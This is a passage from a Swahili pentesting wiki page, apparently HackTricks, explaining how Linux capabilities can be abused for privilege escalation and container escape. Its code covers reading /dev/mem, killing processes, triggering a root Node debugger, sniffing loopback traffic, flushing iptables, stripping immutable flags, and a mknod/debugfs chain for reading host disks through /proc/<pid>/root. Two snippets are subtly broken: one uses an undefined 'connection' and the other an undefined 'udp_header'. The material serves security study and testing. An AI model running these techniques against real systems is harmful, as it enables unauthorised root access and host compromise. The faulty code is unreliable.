0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```

Uwezo huu huruhusu kuandika capabilities za faili, lakini wenyewe hauipi process ya sasa capabilities hizo wala haupiti kanuni za faili, bounding-set, na namespace zinazotumika faili linapotekelezwa.<sup>[[14]](#references)</sup>

```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```

Uwezo (capabilities) unaoruhusiwa kwa faili hupunguzwa na seti ya uwezo ya mchakato ya bounding, na biti ya effective ya faili hudhibiti iwapo seti ya uwezo inayoidhinishwa na faili itaongezwa kwenye seti ya effective ya mchakato. Ndiyo maana kuongeza uwezo kwenye faili hakufanyi kila uwezo ulioombwa uweze kutumika kiotomatiki wakati wa utekelezaji.<sup>[[14]](#references)</sup>

## CAP_SYS_RAWIO

[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) huruhusu shughuli kadhaa nyeti, zikiwemo kufikia `/dev/mem`, `/dev/kmem` au `/proc/kcore`, kurekebisha `mmap_min_addr`, kutumia system calls za `ioperm(2)` na `iopl(2)`, na kutekeleza amri mbalimbali za diski. `FIBMAP ioctl(2)` pia huwezeshwa kupitia uwezo huu, jambo ambalo limesababisha matatizo [zamani](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html). Kulingana na ukurasa wa man, hii pia humruhusu mwenye uwezo huo kutekeleza shughuli mbalimbali mahususi za kifaa kwenye vifaa vingine.<sup>[[14]](#references)</sup>

Hii inaweza kusaidia katika **privilege escalation** na **Docker breakout**.<sup>[[14]](#references)</sup>

Uwezo huu pekee hauleti kiolesura chenye manufaa. Ili kufanya container breakout, pia kunahitajika kifaa au rasilimali ya host inayoweza kufikiwa, ruhusa za device-cgroup na filesystem, na mbinu mahususi kwa hardware na kernel. `/dev/mem` yenye vizuizi vikali, kernel lockdown, virtualization, seccomp, na sera za LSM mara nyingi huzuia njia za jumla. Kwanza hakiki uwezo huo na kile kinachoweza kufikiwa:

```bash
capsh --print | grep cap_sys_rawio
ls -l /dev/mem /dev/port 2>/dev/null
find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
```

Ikiwa `/dev/mem` ndiyo kiolesura kilichoidhinishwa, maabara ya muda mfupi inaweza kuonyesha ufichuaji wa kumbukumbu ya node unaovuka mipaka kwa kusoma na kukokotoa hash ya eneo lililochaguliwa kutoka kwenye ramani ya maunzi ya maabara hiyo:

```bash
approved_physical_address=<lab-provided-decimal-address>
approved_byte_count=<lab-provided-size>
dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
  skip="${approved_physical_address}" count="${approved_byte_count}" status=none
wc -c /tmp/ht-rawio-proof.bin
sha256sum /tmp/ht-rawio-proof.bin
rm /tmp/ht-rawio-proof.bin
```

Usikisie range: kusoma baadhi ya maeneo ya MMIO kunaweza kusababisha athari za pembeni, na anwani halali kwenye platform moja inaweza kudhibiti hardware au memory ya kernel kwenye nyingine. Kubadilisha kernel memory au kudhibiti kifaa kunahitaji uthibitisho ulioidhinishwa na mahususi kwa platform; hakuna mfano salama wa jumla wa raw-write.

## CAP_KILL

**Capability hii hupita ukaguzi wa ruhusa za kutuma signals kwa processes katika hali zilizoainishwa na kernel**.<sup>[[14]](#references)</sup>

**Mfano wa binary**

Tuseme binary ya **`python`** ina capability hii. Ikiwa ungeweza **pia kurekebisha usanidi wa service au socket** (au faili yoyote ya usanidi inayohusiana na service), ungeweza kuiwekea backdoor, kisha kuua process inayohusiana na service hiyo na kusubiri faili mpya ya usanidi iendeshwe ikiwa na backdoor yako.

```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```

**Privesc with kill**

Ikiwa una uwezo wa kill na kuna **programu ya node inayoendeshwa kama root** (au kama mtumiaji mwingine), huenda ukaweza **kutuma** **signal ya SIGUSR1** na kuifanya **ifungue node debugger** ili uweze kuunganishwa nayo.

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```


{{#ref}}
../software-information/electron-cef-chromium-debugger-abuse.md
{{#endref}}


## CAP_NET_BIND_SERVICE

**Capability hii huruhusu kufunga kwenye bandari za Internet zilizo chini ya 1024.** Haitoi moja kwa moja privilege escalation pana zaidi.<sup>[[14]](#references)</sup>

**Mfano wa kutumia binary**

Ikiwa **`python`** ina capability hii, itaweza kusikiliza kwenye bandari yoyote na hata kuunganisha kutoka hapo hadi bandari nyingine yoyote (baadhi ya huduma huhitaji miunganisho kutoka kwenye bandari zenye privileges maalum)

{{#tabs}}
{{#tab name="Listen"}}

```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
        output = connection.recv(1024).strip();
        print(output)
```

{{#endtab}}

{{#tab name="Connect"}}

```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```

{{#endtab}}
{{#endtabs}}

## CAP_NET_RAW

[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) huruhusu michakato **kuunda soketi za RAW na PACKET**, hivyo kuiwezesha kutengeneza na kutuma pakiti zozote za mtandao. Hili linaweza kusababisha hatari za usalama katika mazingira ya container, kama vile kughushi pakiti, kuingiza trafiki na kukwepa vidhibiti vya ufikiaji wa mtandao. Watendaji hasidi wanaweza kutumia uwezo huu kuingilia uelekezaji wa trafiki wa container au kuhatarisha usalama wa mtandao wa host, hasa bila ulinzi wa kutosha wa firewall. Zaidi ya hayo, **CAP_NET_RAW** inasaidia shughuli kama vile kutumia ping kupitia maombi ya RAW ICMP.<sup>[[14]](#references)</sup>

**Hili linaweza kuwezesha kunasa pakiti kwa kutumia kiolesura cha soketi kinachofaa.** Halitoi moja kwa moja ruhusa pana zaidi za kuongeza mamlaka.<sup>[[14]](#references)</sup>

Kwa njia ya kufichua taarifa za uthibitishaji, thibitisha pia kwamba akaunti ya sasa inaweza kutekeleza zana ya kunasa trafiki yenye capabilities zinazotumika, kwamba trafiki husika inapitia kiolesura kinachoonekana katika network namespace yake, na kwamba taarifa za uthibitishaji zinatumwa bila usimbaji fiche. Kwa mfano, taarifa za HTTP Basic kwenye HTTP isiyosimbwa fiche zinaweza kuonekana kupitia loopback iwapo zana ya kunasa trafiki inaweza kufikia kiolesura hicho. Kubadili akaunti pia kunahitaji kwamba taarifa za uthibitishaji zilizonaswa zikubaliwe kwa utambulisho mwingine; file capability au ombi la kuingia linaloonekana pekee halithibitishi kwamba nenosiri limetumika tena.

Kwenye host isiyotumia waya, zana ya ukaguzi wa WPS inayotekelezeka kama `reaver` yenye `CAP_NET_RAW` inayotumika, pamoja na AP na kiolesura cha monitor-mode vinavyoonekana kupitia `iw dev`, ni kidokezo kingine cha kukagua. **Huu si uthibitisho wa njia inayoweza kutumika kuongeza mamlaka:** AP lazima iwe na uthibitishaji wa WPS PIN usiozuiwa ipasavyo baada ya majaribio mengi, iweze kufikiwa kutoka kwenye kiolesura cha wireless, na ifichue PSK; mamlaka ya host hubadilika tu ikiwa PSK hiyo imetumika tena kwa akaunti. Uorodheshaji tulivu unapaswa kuripoti modes na capabilities za violesura, si kutuma probes au kujaribu PIN. Tazama [CERT/CC VU#723755](https://www.kb.cert.org/vuls/id/723755) kuhusu udhaifu wa WPS PIN na [hati za mradi wa Reaver](https://github.com/shift/reaver-wps) kuhusu tabia ya zana hiyo.

**Mfano wenye binary**

Ikiwa binary **`tcpdump`** ina capability hii, utaweza kuitumia kunasa taarifa za mtandao.

```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```

Ikiwa **mazingira** yatatoa uwezo huu, **`tcpdump`** pia inaweza kuutumia kunasa trafiki.<sup>[[14]](#references)</sup>

**Mfano wa binary 2**

Mfano ufuatao ni msimbo wa **`python2`** ambao unaweza kusaidia kunasa trafiki ya kiolesura cha "**lo**" (**localhost**). Msimbo huu umetoka kwenye maabara "_The Basics: CAP-NET_BIND + NET_RAW_" kutoka [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com).<sup>[[1]](#references)</sup>

```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
    flag=""
    for i in xrange(8,-1,-1):
        if( flag_value & 1 <<i ):
            flag= flag + flags[8-i] + ","
    return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
    frame=s.recv(4096)
    ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
    proto=ip_header[6]
    ip_header_size = (ip_header[0] & 0b1111) * 4
    if(proto==6):
        protocol="TCP"
        tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
        tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
        dst_port=tcp_header[0]
        src_port=tcp_header[1]
        flag=" FLAGS: "+getFlag(tcp_header[4])

    elif(proto==17):
        protocol="UDP"
        udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
        udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
        dst_port=udp_header[0]
        src_port=udp_header[1]

    if (proto == 17 or proto == 6):
        print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
        count=count+1
```

## CAP_NET_ADMIN + CAP_NET_RAW

[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) humpa mwenye uwezo wa **kubadilisha usanidi wa mtandao**, ikijumuisha mipangilio ya firewall, jedwali za uelekezaji, ruhusa za socket, na mipangilio ya kiolesura cha mtandao katika network namespace ya sasa. Pia inaweza kuwezesha promiscuous mode kwenye kiolesura katika namespace hiyo; hii inaweza kufichua trafiki inayofikishwa kwenye kiolesura hicho, lakini yenyewe hairuhusu kunusa trafiki kutoka kwenye violesura holela katika network namespaces nyingine.<sup>[[14]](#references)</sup>

Operesheni hizi huathiri **network namespace ya sasa** ya mchakato. Kudhibiti hali ya mtandao wa host kunahitaji `--network=host`, Kubernetes `hostNetwork: true`, au utaratibu tofauti wa kuingia kwenye namespace. `CAP_NET_RAW` peke yake si shell ya jumla ya host, lakini ilishiriki katika njia ya escape maalumu kwa protocol iliyoandikwa: mnyororo wa kihistoria wa GCE uliunganisha root, network namespace ya host, `CAP_NET_ADMIN`, `CAP_NET_RAW`, trafiki ya metadata ya plaintext, na ombi la guest-agent linaloweza kushindaniwa kwa muda ili kuingiza ufunguo wa SSH. Tazama [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html) kwa masharti yote ya awali na tahadhari kuhusu metadata ya kisasa ya HTTPS.

**Mfano wenye binary**

Tuseme **binary ya python** ina capabilities hizi.

```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```

## CAP_LINUX_IMMUTABLE

**Capability hii inaruhusu kurekebisha inode flags kama vile immutable na append-only. Haitoi moja kwa moja fursa pana zaidi za privilege escalation.**<sup>[[14]](#references)</sup>

**Mfano wa binary**

Ukigundua kuwa faili ni immutable na python ina capability hii, unaweza **kuondoa sifa ya immutable na kufanya faili liweze kurekebishwa:**

```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
# Python code to remove the immutable flag and allow modifications
import fcntl
import os
import struct

FS_IMMUTABLE_FL = 0x00000010
FS_IOC_GETFLAGS = 0x80086601
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
flags = struct.unpack('i', fcntl.ioctl(fd, FS_IOC_GETFLAGS, struct.pack('i', 0)))[0]
fcntl.ioctl(fd, FS_IOC_SETFLAGS, struct.pack('i', flags & ~FS_IMMUTABLE_FL))
os.close(fd)

with open('/path/to/file.sh', 'a') as f:
    f.write('New content for the file\n')
```

Operesheni za `FS_IOC_GETFLAGS` na `FS_IOC_SETFLAGS` husoma na kusasisha flags za inode; `FS_IMMUTABLE_FL` ni flag ya immutable inayoondolewa na mfano huu.<sup>[[27]](#references)</sup>

> [!TIP]
> Kumbuka kwamba kwa kawaida attribute hii ya immutable huwekwa na kuondolewa kwa kutumia:
>
> ```bash
> sudo chattr +i file.txt
> sudo chattr -i file.txt
> ```

## CAP_SYS_CHROOT

[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) huwezesha utekelezaji wa system call ya `chroot(2)`, ambayo inaweza kuruhusu escape kutoka kwenye chroot jail iliyoundwa kwa udhaifu kwa kutumia mbinu zinazojulikana.<sup>[[11]](#references)[[14]](#references)</sup>

Hii ni **uwezo wa escape kutoka kwenye chroot jail, si njia ya kujitegemea ya escape kutoka kwenye container hadi host**. Haifichui filesystem ya host wala kupita ruhusa zake. Ikiwa root ya host tayari imewekwa au inaweza kufikiwa kupitia `/proc/<pid>/root`, `chroot()` hufanya tu mti huo uliopo kuwa root ya njia za faili za mchakato. Kando na hilo, kubadilisha mount namespaces kwa `setns(2)` kunahitaji `CAP_SYS_CHROOT` na `CAP_SYS_ADMIN` katika user namespace ya mpigaji, pamoja na `CAP_SYS_ADMIN` katika user namespace inayomiliki mount namespace lengwa.<sup>[[14]](#references)</sup>

- [Jinsi ya kutoka kwenye suluhisho mbalimbali za chroot](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf).<sup>[[11]](#references)</sup>
- [chw00t: zana ya escape kutoka chroot](https://github.com/earthquake/chw00t/)

## CAP_SYS_BOOT

[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) huruhusu utekelezaji wa system call ya `reboot(2)` kwa ajili ya kuwasha upya mfumo, ikijumuisha amri kama `LINUX_REBOOT_CMD_RESTART2`; pia huwezesha `kexec_load(2)` na, kuanzia Linux 3.17, `kexec_file_load(2)` kwa kupakia kernel mpya au kernel zilizotiwa saini za crash, mtawalia.<sup>[[14]](#references)</sup>

Ndani ya private PID namespace, ombi la `reboot()` linaloungwa mkono hukatisha mchakato wa init wa namespace hiyo badala ya kuwasha upya host. Kwa hiyo, athari ya kuwasha upya host inahitaji initial PID namespace, kwa kawaida kupitia kushiriki PID za host. Utekaji wa mfumo kwa kutumia kexec pia huhitaji image inayooana, syscall inayopatikana, na sera za lockdown na sahihi zinazoruhusu. Usichochee operesheni yoyote kati ya hizi kwenye host inayoshirikiwa kwa madhumuni tu ya kuthibitisha uwezo huu:

```bash
capsh --print | grep cap_sys_boot
readlink /proc/self/ns/pid /proc/1/ns/pid
command -v kexec 2>/dev/null
cat /sys/kernel/security/lockdown 2>/dev/null
```

## CAP_SYSLOG

[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) ilitenganishwa na **CAP_SYS_ADMIN** pana zaidi katika Linux 2.6.37, hasa ili kutoa uwezo wa kutumia mwito wa `syslog(2)`. Capability hii huwezesha kuona anwani za kernel kupitia `/proc` na violesura vinavyofanana wakati mpangilio wa `kptr_restrict` ni 1, unaodhibiti ufichuzi wa anwani za kernel. Tangu Linux 2.6.39, thamani chaguomsingi ya `kptr_restrict` ni 0, kumaanisha anwani za kernel hufichuliwa, ingawa distribusheni nyingi huiweka kuwa 1 (huficha anwani isipokuwa kwa uid 0) au 2 (huficha anwani kila wakati) kwa sababu za usalama.<sup>[[14]](#references)</sup>

Zaidi ya hayo, **CAP_SYSLOG** huruhusu kufikia matokeo ya `dmesg` wakati `dmesg_restrict` imewekwa kuwa 1. Licha ya mabadiliko haya, **CAP_SYS_ADMIN** bado ina uwezo wa kutekeleza shughuli za `syslog` kutokana na mazoea ya kihistoria.<sup>[[14]](#references)</sup>

## CAP_MKNOD

[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) hupanua utendaji wa system call ya `mknod` zaidi ya kuunda faili za kawaida, FIFO (named pipes), au UNIX domain sockets. Hasa huruhusu kuunda faili maalum, zikiwemo:<sup>[[14]](#references)</sup>

- **S_IFCHR**: Faili maalum za character, ambazo ni vifaa kama vile vituo.
- **S_IFBLK**: Faili maalum za block, ambazo ni vifaa kama vile diski.

Capability hii ni muhimu kwa michakato inayohitaji kuunda faili za vifaa, zikiwemo vifaa vya character au block.<sup>[[14]](#references)</sup>

Imejumuishwa katika seti chaguomsingi ya capability iliyoandikwa kwenye nyaraka za Docker; thibitisha usanidi halisi wa runtime badala ya kudhani kuwa kila deployment hutumia mipangilio chaguomsingi ileile ([Moby default capability list](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).<sup>[[19]](#references)</sup>

Kwa container escape, `CAP_MKNOD` inaweza kuunda handle inayokosekana ya kifaa halisi cha host, lakini **haiundi** kifaa husika na **haipiti** device cgroup. Mlolongo kamili unahitaji:

1. `CAP_MKNOD` inayotumika katika initial user namespace, kwa sababu uundaji wa vifaa hauwekwi kwenye namespace.
2. Aina sahihi ya block au character pamoja na nambari za major/minor za kifaa halisi cha host.
3. Ruhusa ya device cgroup ya kufungua kifaa hicho.
4. Kisomaji kinachooana na filesystem, au `CAP_SYS_ADMIN` ili kupachika filesystem ya block.
5. Ruhusa za filesystem na LSM za kuunda na kutumia node.

Kwa kifaa cha block cha lab cha ext-family ambacho nambari zake halisi za major/minor ni `252:1`, uthibitishaji wa kusoma pekee ni:

```bash
mknod /dev/ht-node-root b 252 1
ls -l /dev/ht-node-root
debugfs -R 'cat /etc/hostname' /dev/ht-node-root
rm /dev/ht-node-root
```

Badilisha nambari ziwe zile zilizoonyeshwa na `/sys/class/block/<device>/dev`. Ikiwa kuunda node kunafaulu lakini kuifungua kunarudisha `Operation not permitted`, device cgroup bado inazuia ufikiaji. Haya ndiyo matokeo ya kawaida kwenye container yenye `CAP_MKNOD` ya kawaida ya Docker pekee, bila ruhusa mahususi ya kifaa.

Pia kuna mbinu tofauti ya **two-foothold local privilege-escalation** ambayo haipaswi kuchanganywa na ufikiaji wa moja kwa moja wa kifaa cha container. Mchakato wa root kwenye container inayoshiriki initial user namespace unaweza kuunda node ya block device, huku shell isiyo na upendeleo kwenye host yenye UID inayolingana ikiifungua node hiyo kupitia `/proc/<container-pid>/root`. Kisha ufunguzi hutathminiwa katika cgroup ya shell ya host, kwa hivyo kizuizi cha device cgroup cha container hakiwezi tena kulinda kifaa.<sup>[[7]](#references)</sup>

Ndani ya container, tengeneza node na uache mchakato ukiendelea kufanya kazi kama UID ya foothold iliyopo kwenye host:

```bash
host_uid=1000 # Replace with the UID of the existing unprivileged host shell.
mknod /dev/ht-node-root b 252 1 # Replace with the real host device numbers.
chown "$host_uid" /dev/ht-node-root
chmod 600 /dev/ht-node-root
bridge_user=$(getent passwd "$host_uid" | cut -d: -f1)
if [ -z "$bridge_user" ]; then
  useradd -u "$host_uid" -M htbridge
  bridge_user=htbridge
fi
su -s /bin/sh "$bridge_user" -c 'sleep 600'
```

Kutoka kwenye shell ya host iliyopo yenye UID hiyo, tambua PID ya host ya mchakato wa container uliolala, kisha tumia root ya procfs yake kama njia ya kifaa:

```bash
container_pid=<host-pid-of-the-matching-uid-process>
stat "/proc/${container_pid}/root/dev/ht-node-root"
debugfs -R 'cat /etc/hostname' "/proc/${container_pid}/root/dev/ht-node-root"
```

Msururu huu unahitaji foothold zote mbili, user namespace yenye ramani ya utambulisho inayolingana au iliyoshirikiwa, ruhusa ya kupitia `/proc/<pid>/root` inayolengwa, kifaa halisi chenye nambari sahihi za major/minor, na cgroup ya nje inayoruhusu kufungua kifaa. `hidepid`, sheria za ufikiaji wa ptrace, LSM, kutopatana kwa mfumo wa faili, au urekebishaji wa ramani ya user namespace vinaweza kuuzuia. Mbinu hii ya kihistoria ni muhimu hasa kwa sababu inaeleza jinsi `/proc/<pid>/root` inavyoweza kukwepa kizuizi cha device-cgroup cha *container*; haimaanishi kwamba `CAP_MKNOD` pekee inaweza kutoroka kutoka kwenye container iliyotengwa kwa kawaida.<sup>[[7]](#references)</sup>

### CAP_SETPCAP

Kwenye Linux kernels za sasa zinazotumia file capabilities, **`CAP_SETPCAP`** huruhusu thread kuongeza capabilities kutoka kwenye bounding set yake hadi kwenye inheritable set yake, kuondoa capabilities kwenye bounding set yake, na kubadilisha securebits zake. Hairuhusu mchakato kutoa capabilities kiholela kwa mchakato mwingine; tabia hiyo hutumika tu kwenye kernels za kabla ya 2.6.25 ambazo hazitumii file-capability.<sup>[[14]](#references)</sup>

System call ya `capset()` inaweza kurekebisha seti za effective, permitted, na inheritable za thread yenyewe, lakini seti mpya ya permitted haiwezi kuwa na capabilities ambazo hazipo kwenye seti ya permitted iliyopo, na marekebisho ya inheritable bado yanategemea vikwazo vya kernel.<sup>[[14]](#references)</sup>

## References

- [1] [AttackDefense (Pentester Academy) - maabara za privilege escalation za Linux capabilities](https://attackdefense.pentesteracademy.com)
- [2] [Hacker's Grimoire - Linux privilege escalation](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
- [3] [Misingi ya Linux Container: Capabilities](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
- [4] [Utangulizi wa Linux capabilities](https://linux-audit.com/linux-capabilities-101/)
- [5] [Kutumia Linux Capabilities kwa Faida](https://www.linuxjournal.com/article/5737)
- [6] [Capabilities Zilizozidi](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
- [7] [Kutumia vibaya ufikiaji wa mount namespaces kupitia /proc/pid/root](https://labs.reversec.com/posts/2020/06/abusing-access-to-mount-namespaces-through-procpidroot)
- [8] [Linux Capabilities: Kwa Nini Zipo na Jinsi Zinavyofanya Kazi](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
- [9] [Kuelewa Capabilities katika Linux](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)
- [10] [PoC ya kukwepa seccomp ikiwa ptrace inaruhusiwa](https://gist.github.com/thejh/8346f47e359adecd1d53)
- [11] [Jinsi ya kutoroka kutoka kwenye suluhisho mbalimbali za chroot](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
- [12] [shocker.c - exploit asilia ya Docker breakout ya CAP_DAC_READ_SEARCH, na Sebastian Krahmer](http://stealth.openwall.net/xSports/shocker.c)
- [13] [Uchambuzi wa Docker breakout exploit](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)
- [14] [capabilities(7) - ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [15] [proc_pid_status(5) - ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man5/proc_pid_status.5.html)
- [16] [pam_cap(8) - ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/pam_cap.8.html)
- [17] [capability.conf(5) - ukurasa wa mwongozo wa Ubuntu](https://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)
- [18] [systemd.exec(5) - ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man5/systemd.exec.5.html)
- [19] [Kuendesha containers - Docker Docs](https://docs.docker.com/engine/containers/run/)
- [20] [docker container run - Docker Docs](https://docs.docker.com/reference/cli/docker/container/run)
- [21] [cap_text_formats(7) - ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man7/cap_text_formats.7.html)
- [22] [getpcaps(8) - ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/getpcaps.8.html)
- [23] [getcap(8) - ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [24] [amicontained](https://github.com/genuinetools/amicontained)
- [25] [setcap(8) - ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/setcap.8.html)
- [26] [capsh(1) - ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man1/capsh.1.html)
- [27] [ioctl_iflags(2) - ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man2/ioctl_iflags.2.html)
{{#include ../../banners/hacktricks-training.md}}
